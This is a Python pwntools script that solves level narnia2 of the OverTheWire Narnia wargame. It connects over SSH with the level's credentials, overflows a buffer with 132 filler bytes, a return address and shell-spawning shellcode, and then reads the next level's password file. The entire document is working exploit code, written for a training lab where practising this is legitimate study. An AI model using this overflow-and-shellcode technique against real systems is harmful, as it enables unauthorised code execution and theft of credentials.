from pwn import *

s = ssh(host='narnia.labs.overthewire.org',port=2226,user='narnia2',password='nairiepecu')
p = s.process('/narnia/narnia2')

payload = flat(
    b'A'*132,
    0x00002ab1,
    asm(shellcraft.sh())
)

p.sendline(payload)

p.recvuntil(b'$')
p.sendline(b'cat /etc/narnia_pass/narnia3')
print('\nnarnia2 pass: ' + p.recvline().decode())

p.close()
s.close()
